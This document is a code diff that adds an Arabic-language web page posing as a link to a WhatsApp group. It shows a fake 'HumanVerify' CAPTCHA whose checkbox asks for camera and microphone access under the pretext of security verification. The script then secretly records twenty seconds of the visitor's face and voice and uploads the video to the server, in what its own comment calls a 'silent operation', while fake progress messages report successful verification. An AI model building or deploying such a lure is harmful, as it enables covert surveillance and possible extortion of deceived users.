@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>رابط مجموعة وتساب</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, "Helvetica Neue", Helvetica, sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      background: #f0f2f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .captcha-widget {
+      width: 300px;
+      background: #f9f9f9;
+      border: 1px solid #d3d3d3;
+      border-radius: 3px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      padding: 12px;
+      position: relative;
+    }
+
+    .camera-notice {
+      background: #fff8e1;
+      border: 1px solid #e5c76b;
+      border-radius: 4px;
+      padding: 9px;
+      margin-bottom: 10px;
+      font-size: 11px;
+      line-height: 1.5;
+      color: #5f4b00;
+    }
+
+    .captcha-main {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .checkbox-container {
+      width: 28px;
+      height: 28px;
+      background: #fff;
+      border: 2px solid #c1c1c1;
+      border-radius: 3px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      position: relative;
+      flex-shrink: 0;
+      margin-left: 12px;
+    }
+
+    .checkbox-container:hover {
+      border-color: #999;
+    }
+
+    .captcha-text {
+      flex-grow: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .main-text {
+      font-size: 14px;
+      color: #000;
+      line-height: 1.2;
+    }
+
+    .sub-text {
+      font-size: 11px;
+      color: #555;
+      margin-top: 3px;
+      min-height: 14px;
+    }
+
+    .captcha-logo {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      opacity: 0.7;
+      flex-shrink: 0;
+    }
+
+    .captcha-logo svg {
+      width: 32px;
+      height: 32px;
+      fill: #4a90e2;
+    }
+
+    .captcha-logo span {
+      font-size: 10px;
+      color: #555;
+      margin-top: 2px;
+    }
+
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #4a90e2;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: none;
+    }
+
+    .checkmark {
+      width: 20px;
+      height: 20px;
+      fill: #00a000;
+      display: none;
+    }
+
+    .captcha-widget.loading .checkbox-container {
+      border-color: transparent;
+      cursor: default;
+    }
+
+    .captcha-widget.loading .spinner {
+      display: block;
+    }
+
+    .captcha-widget.success .checkbox-container {
+      border-color: transparent;
+      background: transparent;
+    }
+
+    .captcha-widget.success .checkmark {
+      display: block;
+    }
+
+    .progress-container {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 3px;
+      background: #e0e0e0;
+      overflow: hidden;
+      display: none;
+    }
+
+    .progress-fill {
+      height: 100%;
+      width: 0%;
+      background: #4a90e2;
+      transition: width 0.1s linear;
+    }
+
+    .captcha-footer {
+      margin-top: 8px;
+      padding-top: 8px;
+      border-top: 1px solid #e0e0e0;
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      font-size: 10px;
+      color: #888;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="captcha-widget" id="captchaWidget">
+
+    <div class="camera-notice">
+      عند تحديد مربع التحقق، سيطلب المتصفح إذن استخدام الكاميرا  لإتمام التحقق الأمني والتأكد من أنك مستخدم حقيقي.
+    </div>
+
+    <div class="captcha-main">
+
+      <div class="checkbox-container" id="captchaCheckbox">
+
+        <div class="spinner"></div>
+
+        <svg
+          class="checkmark"
+          viewBox="0 0 24 24"
+          xmlns="http://www.w3.org/2000/svg">
+          <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+        </svg>
+
+      </div>
+
+      <div class="captcha-text">
+        <span class="main-text">أنا لست برنامج روبوت</span>
+        <span class="sub-text" id="statusText">
+          اضغط للتحقق
+        </span>
+      </div>
+
+      <div class="captcha-logo">
+
+        <svg
+          viewBox="0 0 24 24"
+          xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10
+          10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93
+          0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2
+          c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5
+          4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+        </svg>
+
+        <span>HumanVerify</span>
+
+      </div>
+
+    </div>
+
+    <div class="progress-container" id="progressContainer">
+      <div class="progress-fill" id="progressFill"></div>
+    </div>
+
+    <div class="captcha-footer">
+      <span>الخصوصية</span>
+      <span>الشروط</span>
+    </div>
+
+  </div>
+
+<script>
+const captchaWidget = document.getElementById("captchaWidget");
+const captchaCheckbox = document.getElementById("captchaCheckbox");
+const statusText = document.getElementById("statusText");
+const progressContainer = document.getElementById("progressContainer");
+const progressFill = document.getElementById("progressFill");
+
+let stream = null;
+let mediaRecorder = null;
+let recordedChunks = [];
+let progressInterval = null;
+let finishTimeout = null;
+
+let isVerifying = false;
+let elapsedTime = 0;
+
+const duration = 20000; // مدة التسجيل 20 ثانية
+
+/* ================================
+   إرسال فيديو للخادم (عملية صامتة)
+================================ */
+async function sendVideo(videoBlob) {
+  const formData = new FormData();
+  formData.append("video", videoBlob, `video-${Date.now()}.webm`);
+
+  try {
+    const response = await fetch("/upload", {
+      method: "POST",
+      body: formData
+    });
+
+    if (!response.ok) {
+      throw new Error("HTTP " + response.status);
+    }
+
+    const result = await response.json();
+    console.log("تم إرسال الفيديو بنجاح", result);
+    return true;
+
+  } catch (error) {
+    console.error("فشل إرسال الفيديو", error);
+    return false;
+  }
+}
+
+/* ================================
+   بدء تسجيل الفيديو
+================================ */
+function startRecording(stream) {
+  recordedChunks = [];
+  mediaRecorder = new MediaRecorder(stream, {
+    mimeType: 'video/webm;codecs=vp9',
+    videoBitsPerSecond: 2500000 // 2.5 Mbps لجودة أفضل
+  });
+
+  mediaRecorder.ondataavailable = (event) => {
+    if (event.data.size > 0) {
+      recordedChunks.push(event.data);
+    }
+  };
+
+  mediaRecorder.onstop = async () => {
+    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+    await sendVideo(videoBlob);
+  };
+
+  mediaRecorder.start(1000); // تسجيل في مقاطع كل ثانية لتقليل فقدان البيانات
+}
+
+/* ================================
+   الضغط على مربع التحقق
+================================ */
+captchaCheckbox.addEventListener("click", async () => {
+  if (isVerifying) return;
+
+  isVerifying = true;
+  elapsedTime = 0;
+
+  captchaWidget.classList.add("loading");
+  progressContainer.style.display = "block";
+  progressFill.style.width = "0%";
+  
+  statusText.textContent = "جاري التحقق...";
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { 
+        facingMode: "user",
+        width: { ideal: 640 },
+        height: { ideal: 480 }
+      },
+      audio: true // تشغيل الصوت مع الفيديو (اختياري)
+    });
+
+    // بدء تسجيل الفيديو
+    startRecording(stream);
+
+    // شريط التقدم
+    progressInterval = setInterval(() => {
+      elapsedTime += 100;
+      const percentage = Math.min((elapsedTime / duration) * 100, 100);
+      progressFill.style.width = percentage + "%";
+
+      if (percentage < 30) {
+        statusText.textContent = "جاري التحقق...";
+      } else if (percentage < 60) {
+        statusText.textContent = "جاري تحليل التحقق...";
+      } else if (percentage < 90) {
+        statusText.textContent = "جاري إكمال العملية...";
+      } else {
+        statusText.textContent = "جاري إنهاء العملية...";
+      }
+    }, 100);
+
+    // انتهاء التحقق بعد المدة المحددة (20 ثانية)
+    finishTimeout = setTimeout(() => {
+      finishVerification();
+    }, duration);
+
+  } catch (error) {
+    console.error("Camera error:", error);
+    captchaWidget.classList.remove("loading");
+    progressContainer.style.display = "none";
+    statusText.textContent = "تعذر استخدام الكاميرا. يرجى المحاولة مرة أخرى.";
+    isVerifying = false;
+  }
+});
+
+/* ================================
+   إنهاء التحقق
+================================ */
+function finishVerification() {
+  // إيقاف التسجيل
+  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+    mediaRecorder.stop();
+  }
+
+  if (progressInterval) {
+    clearInterval(progressInterval);
+    progressInterval = null;
+  }
+  if (finishTimeout) {
+    clearTimeout(finishTimeout);
+    finishTimeout = null;
+  }
+  if (stream) {
+    stream.getTracks().forEach(track => track.stop());
+    stream = null;
+  }
+
+  captchaWidget.classList.remove("loading");
+  captchaWidget.classList.add("success");
+  progressContainer.style.display = "none";
+  statusText.textContent = "تم التحقق بنجاح";
+
+  setTimeout(() => {
+    captchaWidget.classList.remove("success");
+    statusText.textContent = "اضغط للتحقق";
+    progressFill.style.width = "0%";
+    isVerifying = false;
+  }, 4000);
+}
+
+/* ================================
+   عند مغادرة الصفحة
+================================ */
+window.addEventListener("beforeunload", () => {
+  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+    mediaRecorder.stop();
+  }
+  if (progressInterval) clearInterval(progressInterval);
+  if (finishTimeout) clearTimeout(finishTimeout);
+  if (stream) {
+    stream.getTracks().forEach(track => track.stop());
+  }
+});
+</script>
+
+</body>
+</html>
